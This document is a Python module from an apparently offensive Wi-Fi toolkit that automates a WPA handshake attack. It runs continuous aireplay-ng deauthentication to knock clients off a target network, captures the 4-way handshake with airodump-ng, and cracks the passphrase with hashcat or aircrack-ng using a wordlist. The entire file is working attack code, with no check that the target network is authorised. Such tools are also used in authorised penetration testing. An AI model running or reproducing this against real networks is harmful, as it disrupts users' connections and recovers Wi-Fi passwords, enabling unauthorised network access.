"""
4-way handshake capture + crack. Supports optional dual-NIC mode where one
adapter handles pure RX (airodump-ng capture, never interrupted) and a
second handles pure TX (continuous aireplay-ng deauth) — more reliable than
a single NIC time-multiplexing both roles.
"""

import asyncio
import os
import time
from pathlib import Path

from core.exec_utils import run_command, validate_mac, validate_channel
from core.hardware import start_monitor_mode, stop_monitor_mode, track_process, detect_hashcat_gpu
from core.models import save_result
from core.display import console, info, ok, warn, err, header, StatusLine

CAPTURE_DIR = Path("captures")
HASHCAT_RULES = "/usr/share/hashcat/rules/best64.rule"


async def run_handshake_crack(
    interface: str, bssid: str, channel: str,
    client_mac: str = "", wordlist: str = "",
    deauth_count: int = 0, use_rules: bool = False,
    deauth_interface: str = "", max_duration: int = 600,
) -> None:
    header("4-Way Handshake Capture & Crack")
    if not validate_mac(bssid):
        err("Invalid BSSID"); return
    if not validate_channel(channel):
        err("Invalid channel"); return
    if not wordlist or not os.path.isfile(wordlist):
        err(f"Wordlist not found: {wordlist!r} (pass --wordlist /path/to/list.txt)"); return

    CAPTURE_DIR.mkdir(parents=True, exist_ok=True)

    dual_nic = bool(deauth_interface) and deauth_interface != interface
    capture_mon = await start_monitor_mode(interface)
    ok(f"Capture interface ready: {capture_mon}")

    deauth_mon = capture_mon
    if dual_nic:
        deauth_mon = await start_monitor_mode(deauth_interface)
        ok(f"Deauth interface ready: {deauth_mon} (dedicated TX, capture NIC stays pure RX)")

    capture_prefix = CAPTURE_DIR / f"handshake_{bssid.replace(':','')}"
    dump_cmd = ["sudo", "airodump-ng", "--bssid", bssid, "-c", channel,
                "--write", str(capture_prefix), "--output-format", "cap,csv",
                "--write-interval", "1", capture_mon]
    dump_proc = await asyncio.create_subprocess_exec(*dump_cmd, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE)
    track_process(dump_proc)

    count_str = str(deauth_count) if deauth_count > 0 else "0"
    deauth_cmd = ["sudo", "aireplay-ng", "-0", count_str, "-a", bssid]
    if client_mac:
        deauth_cmd += ["-c", client_mac]
    deauth_cmd.append(deauth_mon)
    deauth_proc = await asyncio.create_subprocess_exec(*deauth_cmd, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE)
    track_process(deauth_proc)
    info(f"Deauth running ({'continuous' if deauth_count == 0 else f'{deauth_count} bursts'})")

    cap_file = Path(str(capture_prefix) + "-01.cap")
    handshake_found = False
    start_time = time.time()

    async def watch_stderr():
        nonlocal handshake_found
        while not handshake_found:
            line = await dump_proc.stderr.readline()
            if not line:
                break
            if b"WPA handshake" in line:
                handshake_found = True
                return

    stderr_task = asyncio.create_task(watch_stderr())

    try:
        with StatusLine("Waiting for handshake...") as status:
            while not handshake_found:
                elapsed = int(time.time() - start_time)
                remaining = max(0, max_duration - elapsed) if max_duration > 0 else None
                status.update(f"elapsed {elapsed}s" + (f" / {remaining}s remaining" if remaining is not None else ""))

                if max_duration > 0 and elapsed >= max_duration:
                    warn(f"\nSession timeout ({max_duration}s) reached — no handshake captured.")
                    break

                if cap_file.exists():
                    try:
                        result = await run_command(["tshark", "-r", str(cap_file), "-Y", "eapol",
                                                     "-T", "fields", "-e", "eapol.keydes.type"])
                        if len([l for l in result.strip().splitlines() if l.strip()]) >= 2:
                            handshake_found = True
                            break
                    except Exception:
                        pass
                await asyncio.sleep(3)
    except (KeyboardInterrupt, asyncio.CancelledError):
        warn("\nStopped by user.")
    finally:
        stderr_task.cancel()
        for p in (deauth_proc, dump_proc):
            if p.returncode is None:
                p.terminate()
                try:
                    await p.wait()
                except Exception:
                    pass

    if handshake_found:
        ok("WPA handshake captured!")
    else:
        await stop_monitor_mode(capture_mon)
        if dual_nic:
            await stop_monitor_mode(deauth_mon)
        if not cap_file.exists():
            err("No capture file and no handshake — nothing to crack.")
            return
        warn("No confirmed handshake, but attempting to crack the capture anyway.")

    # ── Crack ──────────────────────────────────────────────────────────────
    cracked_key = None
    if use_rules:
        hash_file = Path(str(capture_prefix) + ".22000")
        cracked_file = Path(str(capture_prefix) + ".cracked")
        info("Converting capture to hashcat 22000 format...")
        try:
            await run_command(["hcxpcapngtool", "-o", str(hash_file), str(cap_file)])
        except Exception as e:
            err(f"Conversion failed: {e}")
            await stop_monitor_mode(capture_mon)
            if dual_nic:
                await stop_monitor_mode(deauth_mon)
            return
        if not hash_file.exists() or hash_file.stat().st_size == 0:
            err("No hashable handshake data found in capture.")
            await stop_monitor_mode(capture_mon)
            if dual_nic:
                await stop_monitor_mode(deauth_mon)
            return

        crack_cmd = ["hashcat", "-m", "22000", "-a", "0", "--status", "--status-timer=5",
                     "--quiet", "--outfile", str(cracked_file), "--outfile-format", "1",
                     str(hash_file), wordlist]
        if os.path.exists(HASHCAT_RULES):
            crack_cmd += ["-r", HASHCAT_RULES]
            info("Using best64 rules (faster crack against real-world passwords)")

        gpu_available, gpu_summary = await detect_hashcat_gpu()
        if gpu_available:
            ok(gpu_summary)
        else:
            warn(f"{gpu_summary}. For a large wordlist this may be slower than --rules off "
                 f"with aircrack-ng — consider that if this VM/host has no GPU passthrough.")

        info("Cracking with hashcat (GPU-accelerated if available)...")
        crack_proc = await asyncio.create_subprocess_exec(*crack_cmd, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE)
        track_process(crack_proc)
        try:
            with StatusLine("Cracking...") as status:
                while True:
                    line = await crack_proc.stdout.readline()
                    if not line:
                        break
                    decoded = line.decode(errors="replace")
                    if "Progress" in decoded:
                        status.update(decoded.strip())
            await crack_proc.wait()
        except (KeyboardInterrupt, asyncio.CancelledError):
            crack_proc.terminate()

        if cracked_file.exists() and cracked_file.stat().st_size > 0:
            cracked_key = cracked_file.read_text().splitlines()[0].strip()
    else:
        info("Running aircrack-ng (dictionary attack)...")
        crack_proc = await asyncio.create_subprocess_exec(
            "sudo", "aircrack-ng", "-w", wordlist, "-b", bssid, str(cap_file),
            stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE,
        )
        track_process(crack_proc)
        try:
            with StatusLine("Cracking...") as status:
                deadline = asyncio.get_event_loop().time() + 300
                while True:
                    if asyncio.get_event_loop().time() > deadline:
                        crack_proc.terminate()
                        warn("aircrack-ng timed out after 300s")
                        break
                    line = await crack_proc.stdout.readline()
                    if not line:
                        break
                    decoded = line.decode(errors="replace")
                    if "KEY FOUND" in decoded:
                        try:
                            cracked_key = decoded.split("[")[1].split("]")[0]
                        except Exception:
                            cracked_key = "parse error"
                        break
                    if "keys tested" in decoded:
                        status.update(decoded.strip())
        except (KeyboardInterrupt, asyncio.CancelledError):
            crack_proc.terminate()

    await stop_monitor_mode(capture_mon)
    if dual_nic:
        await stop_monitor_mode(deauth_mon)

    if cracked_key:
        ok(f"KEY FOUND: [bold green]{cracked_key}[/bold green]")
        save_result(bssid.replace(":", ""), "handshake", bssid, "", cracked_key)
    else:
        warn(f"Key not found in wordlist. Capture saved at: {cap_file}")
